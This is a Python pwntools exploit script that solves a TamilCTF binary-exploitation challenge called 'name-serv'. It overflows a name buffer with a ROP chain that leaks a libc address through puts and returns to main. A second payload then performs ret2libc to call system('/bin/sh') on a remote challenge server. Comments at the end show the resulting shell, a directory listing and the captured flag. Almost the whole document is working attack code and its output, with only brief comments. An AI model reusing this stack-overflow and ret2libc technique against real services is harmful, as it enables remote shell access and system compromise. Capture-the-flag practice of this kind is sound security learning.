#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF('name-serv')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote('3.97.113.25', 9001)
    else:
        return process([elf.path] + argv, *a, **kw)


# ./exploit.py GDB
gdbscript = '''
break main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
rop = ROP(elf)

# step 1: construct a ROP chain to leak a libc pointer & perform ret2main to create another oob write
payload = b'A'*0x20
payload += b'B'*8 # rbp
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) # ret addr
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym['main'])

io.sendlineafter(b'you name:', payload)


# calc offsets
puts_leak = u64(io.recvline()[1:-1].ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym.puts
log.success(f'leaking puts@libc :: {hex(puts_leak)}')
log.success(f'libc base :: {hex(libc.address)}')


# step 2 - we land in main again, now performing ret2libc
payload = b'A'*0x20
payload += b'B'*8 # rbp
payload += p64(rop.find_gadget(['ret'])[0]) 
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) 
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym.system)

io.sendlineafter(b'you name:', payload)


io.interactive()


# output 
# [+] Opening connection to 3.97.113.25 on port 9001: Done
# [*] Loaded 14 cached gadgets for 'name-serv'
# [+] leaking puts@libc :: 0x7f513dac65a0
# [+] libc base :: 0x7f513da3f000
# [*] Switching to interactive mode
#  $ ls
# flag.txt
# libc.so.6
# name-serv
# start.sh
# $ cat flag.txt
# TamilCTF{ReT_1s_M0rE_p0wErFu1_a5_LIBC}

